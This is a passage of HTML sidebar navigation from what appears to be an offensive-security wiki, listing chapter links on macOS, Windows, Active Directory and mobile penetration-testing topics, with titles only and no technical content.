aria-hidden="true">24.10.</strong> macOS Objective-C</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-privilege-escalation.html"><strong aria-hidden="true">24.11.</strong> macOS Privilege Escalation</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html"><strong aria-hidden="true">24.12.</strong> macOS Process Abuse</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-dirty-nib.html"><strong aria-hidden="true">24.12.1.</strong> macOS Dirty NIB</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.html"><strong aria-hidden="true">24.12.2.</strong> macOS Chromium Injection</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.html"><strong aria-hidden="true">24.12.3.</strong> macOS Electron Applications Injection</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-function-hooking.html"><strong aria-hidden="true">24.12.4.</strong> macOS Function Hooking</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/index.html"><strong aria-hidden="true">24.12.5.</strong> macOS IPC - Inter Process Communication</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.html"><strong aria-hidden="true">24.12.5.1.</strong> macOS MIG - Mach Interface Generator</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/index.html"><strong aria-hidden="true">24.12.5.2.</strong> macOS XPC</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.html"><strong aria-hidden="true">24.12.5.2.1.</strong> macOS XPC Authorization</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/index.html"><strong aria-hidden="true">24.12.5.2.2.</strong> macOS XPC Connecting Process Check</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-pid-reuse.html"><strong aria-hidden="true">24.12.5.2.2.1.</strong> macOS PID Reuse</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-xpc_connection_get_audit_token-attack.html"><strong aria-hidden="true">24.12.5.2.2.2.</strong> macOS xpc_connection_get_audit_token Attack</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.html"><strong aria-hidden="true">24.12.5.3.</strong> macOS Thread Injection via Task port</a></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-java-apps-injection.html"><strong aria-hidden="true">24.12.6.</strong> macOS Java Applications Injection</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/index.html"><strong aria-hidden="true">24.12.7.</strong> macOS Library Injection</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.html"><strong aria-hidden="true">24.12.7.1.</strong> macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-process.html"><strong aria-hidden="true">24.12.7.2.</strong> macOS Dyld Process</a></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.html"><strong aria-hidden="true">24.12.8.</strong> macOS Perl Applications Injection</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-python-applications-injection.html"><strong aria-hidden="true">24.12.9.</strong> macOS Python Applications Injection</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ruby-applications-injection.html"><strong aria-hidden="true">24.12.10.</strong> macOS Ruby Applications Injection</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-.net-applications-injection.html"><strong aria-hidden="true">24.12.11.</strong> macOS .Net Applications Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/index.html"><strong aria-hidden="true">24.13.</strong> macOS Security Protections</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-gatekeeper.html"><strong aria-hidden="true">24.13.1.</strong> macOS Gatekeeper / Quarantine / XProtect</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-launch-environment-constraints.html"><strong aria-hidden="true">24.13.2.</strong> macOS Launch/Environment Constraints & Trust Cache</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/index.html"><strong aria-hidden="true">24.13.3.</strong> macOS Sandbox</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-default-sandbox-debug.html"><strong aria-hidden="true">24.13.3.1.</strong> macOS Default Sandbox Debug</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass/index.html"><strong aria-hidden="true">24.13.3.2.</strong> macOS Sandbox Debug & Bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass/macos-office-sandbox-bypasses.html"><strong aria-hidden="true">24.13.3.2.1.</strong> macOS Office Sandbox Bypasses</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-authorizations-db-and-authd.html"><strong aria-hidden="true">24.13.4.</strong> macOS Authorizations DB & Authd</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sip.html"><strong aria-hidden="true">24.13.5.</strong> macOS SIP</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/index.html"><strong aria-hidden="true">24.13.6.</strong> macOS TCC</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-apple-events.html"><strong aria-hidden="true">24.13.6.1.</strong> macOS Apple Events</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/index.html"><strong aria-hidden="true">24.13.6.2.</strong> macOS TCC Bypasses</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/macos-apple-scripts.html"><strong aria-hidden="true">24.13.6.2.1.</strong> macOS Apple Scripts</a></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-payloads.html"><strong aria-hidden="true">24.13.6.3.</strong> macOS TCC Payloads</a></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-dangerous-entitlements.html"><strong aria-hidden="true">24.13.7.</strong> macOS Dangerous Entitlements & TCC perms</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-amfi-applemobilefileintegrity.html"><strong aria-hidden="true">24.13.8.</strong> macOS - AMFI - AppleMobileFileIntegrity</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-macf-mandatory-access-control-framework.html"><strong aria-hidden="true">24.13.9.</strong> macOS MACF - Mandatory Access Control Framework</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-code-signing.html"><strong aria-hidden="true">24.13.10.</strong> macOS Code Signing</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-fs-tricks/index.html"><strong aria-hidden="true">24.13.11.</strong> macOS FS Tricks</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-fs-tricks/macos-xattr-acls-extra-stuff.html"><strong aria-hidden="true">24.13.11.1.</strong> macOS xattr-acls extra stuff</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-security-and-privilege-escalation/macos-users.html"><strong aria-hidden="true">24.14.</strong> macOS Users & External Accounts</a></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-red-teaming/index.html"><strong aria-hidden="true">25.</strong> macOS Red Teaming</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-red-teaming/macos-mdm/index.html"><strong aria-hidden="true">25.1.</strong> macOS MDM</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../macos-hardening/macos-red-teaming/macos-mdm/enrolling-devices-in-other-organisations.html"><strong aria-hidden="true">25.1.1.</strong> Enrolling Devices in Other Organisations</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-red-teaming/macos-mdm/macos-serial-number.html"><strong aria-hidden="true">25.1.2.</strong> macOS Serial Number</a></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-red-teaming/macos-keychain.html"><strong aria-hidden="true">25.2.</strong> macOS Keychain</a></li></ol></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-useful-commands.html"><strong aria-hidden="true">26.</strong> macOS Useful Commands</a></li><li class="chapter-item expanded "><a href="../macos-hardening/macos-auto-start-locations.html" class="active"><strong aria-hidden="true">27.</strong> macOS Auto Start</a></li><li class="chapter-item expanded affix "><li class="part-title">🪟 Windows Hardening</li><li class="chapter-item expanded "><a href="../windows-hardening/checklist-windows-privilege-escalation.html"><strong aria-hidden="true">28.</strong> Checklist - Local Windows Privilege Escalation</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/index.html"><strong aria-hidden="true">29.</strong> Windows Local Privilege Escalation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"><strong aria-hidden="true">29.1.</strong> Abusing Tokens</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/access-tokens.html"><strong aria-hidden="true">29.2.</strong> Access Tokens</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/acls-dacls-sacls-aces.html"><strong aria-hidden="true">29.3.</strong> ACLs - DACLs/SACLs/ACEs</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/appenddata-addsubdirectory-permission-over-service-registry.html"><strong aria-hidden="true">29.4.</strong> AppendData/AddSubdirectory permission over service registry</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.html"><strong aria-hidden="true">29.5.</strong> Create MSI with WIX</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/com-hijacking.html"><strong aria-hidden="true">29.6.</strong> COM Hijacking</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/dll-hijacking/index.html"><strong aria-hidden="true">29.7.</strong> Dll Hijacking</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/dll-hijacking/writable-sys-path-+dll-hijacking-privesc.html"><strong aria-hidden="true">29.7.1.</strong> Writable Sys Path +Dll Hijacking Privesc</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html"><strong aria-hidden="true">29.8.</strong> DPAPI - Extracting Passwords</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/from-high-integrity-to-system-with-name-pipes.html"><strong aria-hidden="true">29.9.</strong> From High Integrity to SYSTEM with Name Pipes</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/integrity-levels.html"><strong aria-hidden="true">29.10.</strong> Integrity Levels</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/juicypotato.html"><strong aria-hidden="true">29.11.</strong> JuicyPotato</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation.html"><strong aria-hidden="true">29.12.</strong> Leaked Handle Exploitation</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/msi-wrapper.html"><strong aria-hidden="true">29.13.</strong> MSI Wrapper</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation.html"><strong aria-hidden="true">29.14.</strong> Named Pipe Client Impersonation</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html"><strong aria-hidden="true">29.15.</strong> Privilege Escalation with Autoruns</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html"><strong aria-hidden="true">29.16.</strong> RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/sedebug-+-seimpersonate-copy-token.html"><strong aria-hidden="true">29.17.</strong> SeDebug + SeImpersonate copy token</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/seimpersonate-from-high-to-system.html"><strong aria-hidden="true">29.18.</strong> SeImpersonate from High To System</a></li><li class="chapter-item expanded "><a href="../windows-hardening/windows-local-privilege-escalation/windows-c-payloads.html"><strong aria-hidden="true">29.19.</strong> Windows C Payloads</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/index.html"><strong aria-hidden="true">30.</strong> Active Directory Methodology</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html"><strong aria-hidden="true">30.1.</strong> Abusing Active Directory ACLs/ACEs</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.html"><strong aria-hidden="true">30.1.1.</strong> Shadow Credentials</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/ad-certificates/index.html"><strong aria-hidden="true">30.2.</strong> AD Certificates</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html"><strong aria-hidden="true">30.2.1.</strong> AD CS Account Persistence</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"><strong aria-hidden="true">30.2.2.</strong> AD CS Domain Escalation</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.html"><strong aria-hidden="true">30.2.3.</strong> AD CS Domain Persistence</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/ad-certificates/certificate-theft.html"><strong aria-hidden="true">30.2.4.</strong> AD CS Certificate Theft</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/ad-information-in-printers.html"><strong aria-hidden="true">30.3.</strong> AD information in printers</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/ad-dns-records.html"><strong aria-hidden="true">30.4.</strong> AD DNS Records</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/asreproast.html"><strong aria-hidden="true">30.5.</strong> ASREPRoast</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/bloodhound.html"><strong aria-hidden="true">30.6.</strong> BloodHound & Other AD Enum Tools</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/constrained-delegation.html"><strong aria-hidden="true">30.7.</strong> Constrained Delegation</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/custom-ssp.html"><strong aria-hidden="true">30.8.</strong> Custom SSP</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/dcshadow.html"><strong aria-hidden="true">30.9.</strong> DCShadow</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/dcsync.html"><strong aria-hidden="true">30.10.</strong> DCSync</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/diamond-ticket.html"><strong aria-hidden="true">30.11.</strong> Diamond Ticket</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/dsrm-credentials.html"><strong aria-hidden="true">30.12.</strong> DSRM Credentials</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/external-forest-domain-oneway-inbound.html"><strong aria-hidden="true">30.13.</strong> External Forest Domain - OneWay (Inbound) or bidirectional</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/external-forest-domain-one-way-outbound.html"><strong aria-hidden="true">30.14.</strong> External Forest Domain - One-Way (Outbound)</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/golden-ticket.html"><strong aria-hidden="true">30.15.</strong> Golden Ticket</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/kerberoast.html"><strong aria-hidden="true">30.16.</strong> Kerberoast</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/kerberos-authentication.html"><strong aria-hidden="true">30.17.</strong> Kerberos Authentication</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/kerberos-double-hop-problem.html"><strong aria-hidden="true">30.18.</strong> Kerberos Double Hop Problem</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/laps.html"><strong aria-hidden="true">30.19.</strong> LAPS</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/abusing-ad-mssql.html"><strong aria-hidden="true">30.20.</strong> MSSQL AD Abuse</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html"><strong aria-hidden="true">30.21.</strong> Over Pass the Hash/Pass the Key</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/pass-the-ticket.html"><strong aria-hidden="true">30.22.</strong> Pass the Ticket</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/password-spraying.html"><strong aria-hidden="true">30.23.</strong> Password Spraying / Brute Force</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/printnightmare.html"><strong aria-hidden="true">30.24.</strong> PrintNightmare</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html"><strong aria-hidden="true">30.25.</strong> Force NTLM Privileged Authentication</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html"><strong aria-hidden="true">30.26.</strong> Privileged Groups</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.html"><strong aria-hidden="true">30.27.</strong> RDP Sessions Abuse</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html"><strong aria-hidden="true">30.28.</strong> Resource-based Constrained Delegation</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/security-descriptors.html"><strong aria-hidden="true">30.29.</strong> Security Descriptors</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/sid-history-injection.html"><strong aria-hidden="true">30.30.</strong> SID-History Injection</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/silver-ticket.html"><strong aria-hidden="true">30.31.</strong> Silver Ticket</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/skeleton-key.html"><strong aria-hidden="true">30.32.</strong> Skeleton Key</a></li><li class="chapter-item expanded "><a href="../windows-hardening/active-directory-methodology/unconstrained-delegation.html"><strong aria-hidden="true">30.33.</strong> Unconstrained Delegation</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/authentication-credentials-uac-and-efs/index.html"><strong aria-hidden="true">31.</strong> Windows Security Controls</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html"><strong aria-hidden="true">31.1.</strong> UAC - User Account Control</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/ntlm/index.html"><strong aria-hidden="true">32.</strong> NTLM</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/ntlm/places-to-steal-ntlm-creds.html"><strong aria-hidden="true">32.1.</strong> Places to steal NTLM creds</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/lateral-movement/index.html"><strong aria-hidden="true">33.</strong> Lateral Movement</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/lateral-movement/atexec.html"><strong aria-hidden="true">33.1.</strong> AtExec / SchtasksExec</a></li><li class="chapter-item expanded "><a href="../windows-hardening/lateral-movement/dcom-exec.html"><strong aria-hidden="true">33.2.</strong> DCOM Exec</a></li><li class="chapter-item expanded "><a href="../windows-hardening/lateral-movement/psexec-and-winexec.html"><strong aria-hidden="true">33.3.</strong> PsExec/Winexec/ScExec</a></li><li class="chapter-item expanded "><a href="../windows-hardening/lateral-movement/smbexec.html"><strong aria-hidden="true">33.4.</strong> SmbExec/ScExec</a></li><li class="chapter-item expanded "><a href="../windows-hardening/lateral-movement/winrm.html"><strong aria-hidden="true">33.5.</strong> WinRM</a></li><li class="chapter-item expanded "><a href="../windows-hardening/lateral-movement/wmiexec.html"><strong aria-hidden="true">33.6.</strong> WmiExec</a></li></ol></li><li class="chapter-item expanded "><a href="../https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-lateral-movements.html"><strong aria-hidden="true">34.</strong> Pivoting to the Cloud</a></li><li class="chapter-item expanded "><a href="../windows-hardening/stealing-credentials/index.html"><strong aria-hidden="true">35.</strong> Stealing Windows Credentials</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/stealing-credentials/credentials-protections.html"><strong aria-hidden="true">35.1.</strong> Windows Credentials Protections</a></li><li class="chapter-item expanded "><a href="../windows-hardening/stealing-credentials/credentials-mimikatz.html"><strong aria-hidden="true">35.2.</strong> Mimikatz</a></li><li class="chapter-item expanded "><a href="../windows-hardening/stealing-credentials/wts-impersonator.html"><strong aria-hidden="true">35.3.</strong> WTS Impersonator</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/basic-cmd-for-pentesters.html"><strong aria-hidden="true">36.</strong> Basic Win CMD for Pentesters</a></li><li class="chapter-item expanded "><a href="../windows-hardening/basic-powershell-for-pentesters/index.html"><strong aria-hidden="true">37.</strong> Basic PowerShell for Pentesters</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows-hardening/basic-powershell-for-pentesters/powerview.html"><strong aria-hidden="true">37.1.</strong> PowerView/SharpView</a></li></ol></li><li class="chapter-item expanded "><a href="../windows-hardening/av-bypass.html"><strong aria-hidden="true">38.</strong> Antivirus (AV) Bypass</a></li><li class="chapter-item expanded affix "><li class="part-title">📱 Mobile Pentesting</li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-checklist.html"><strong aria-hidden="true">39.</strong> Android APK Checklist</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/index.html"><strong aria-hidden="true">40.</strong> Android Applications Pentesting</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/android-applications-basics.html"><strong aria-hidden="true">40.1.</strong> Android Applications Basics</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/android-task-hijacking.html"><strong aria-hidden="true">40.2.</strong> Android Task Hijacking</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/adb-commands.html"><strong aria-hidden="true">40.3.</strong> ADB Commands</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/apk-decompilers.html"><strong aria-hidden="true">40.4.</strong> APK decompilers</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/avd-android-virtual-device.html"><strong aria-hidden="true">40.5.</strong> AVD - Android Virtual Device</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/bypass-biometric-authentication-android.html"><strong aria-hidden="true">40.6.</strong> Bypass Biometric Authentication (Android)</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/content-protocol.html"><strong aria-hidden="true">40.7.</strong> content:// protocol</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/drozer-tutorial/index.html"><strong aria-hidden="true">40.8.</strong> Drozer Tutorial</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers.html"><strong aria-hidden="true">40.8.1.</strong> Exploiting Content Providers</a></li></ol></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/exploiting-a-debuggeable-applciation.html"><strong aria-hidden="true">40.9.</strong> Exploiting a debuggeable application</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/frida-tutorial/index.html"><strong aria-hidden="true">40.10.</strong> Frida Tutorial</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-1.html"><strong aria-hidden="true">40.10.1.</strong> Frida Tutorial 1</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-2.html"><strong aria-hidden="true">40.10.2.</strong> Frida Tutorial 2</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/frida-tutorial/owaspuncrackable-1.html"><strong aria-hidden="true">40.10.3.</strong> Frida Tutorial 3</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/frida-tutorial/objection-tutorial.html"><strong aria-hidden="true">40.10.4.</strong> Objection Tutorial</a></li></ol></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/google-ctf-2018-shall-we-play-a-game.html"><strong aria-hidden="true">40.11.</strong> Google CTF 2018 - Shall We Play a Game?</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/install-burp-certificate.html"><strong aria-hidden="true">40.12.</strong> Install Burp Certificate</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/intent-injection.html"><strong aria-hidden="true">40.13.</strong> Intent Injection</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/make-apk-accept-ca-certificate.html"><strong aria-hidden="true">40.14.</strong> Make APK Accept CA Certificate</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/manual-deobfuscation.html"><strong aria-hidden="true">40.15.</strong> Manual DeObfuscation</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/react-native-application.html"><strong aria-hidden="true">40.16.</strong> React Native Application</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/reversing-native-libraries.html"><strong aria-hidden="true">40.17.</strong> Reversing Native Libraries</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/smali-changes.html"><strong aria-hidden="true">40.18.</strong> Smali - Decompiling/[Modifying]/Compiling</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/spoofing-your-location-in-play-store.html"><strong aria-hidden="true">40.19.</strong> Spoofing your location in Play Store</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/tapjacking.html"><strong aria-hidden="true">40.20.</strong> Tapjacking</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/android-app-pentesting/webview-attacks.html"><strong aria-hidden="true">40.21.</strong> Webview Attacks</a></li></ol></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting-checklist.html"><strong aria-hidden="true">41.</strong> iOS Pentesting Checklist</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/index.html"><strong aria-hidden="true">42.</strong> iOS Pentesting</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-app-extensions.html"><strong aria-hidden="true">42.1.</strong> iOS App Extensions</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-basics.html"><strong aria-hidden="true">42.2.</strong> iOS Basics</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/basic-ios-testing-operations.html"><strong aria-hidden="true">42.3.</strong> iOS Basic Testing Operations</a></li><li class="chapter-item expanded "><a 